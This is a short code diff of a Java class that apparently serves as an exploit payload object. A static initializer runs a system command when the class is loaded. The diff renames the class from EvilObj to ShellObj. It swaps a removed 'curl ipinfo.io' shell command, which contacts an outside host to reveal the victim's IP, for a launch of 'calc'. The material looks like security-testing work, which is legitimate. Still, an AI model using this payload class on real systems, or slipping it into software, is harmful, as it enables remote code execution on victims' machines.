@@ -4,10 +4,10 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.SequenceInputStream;
 
-public class EvilObj {
+public class ShellObj {
     static {
         try {
-            Process process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "curl ipinfo.io"});
+            Process process = Runtime.getRuntime().exec(new String[]{"calc"});
             process.waitFor();
             SequenceInputStream sis = new SequenceInputStream(process.getInputStream(), process.getErrorStream());
             BufferedReader br = new BufferedReader(new InputStreamReader(sis, "gbk"));
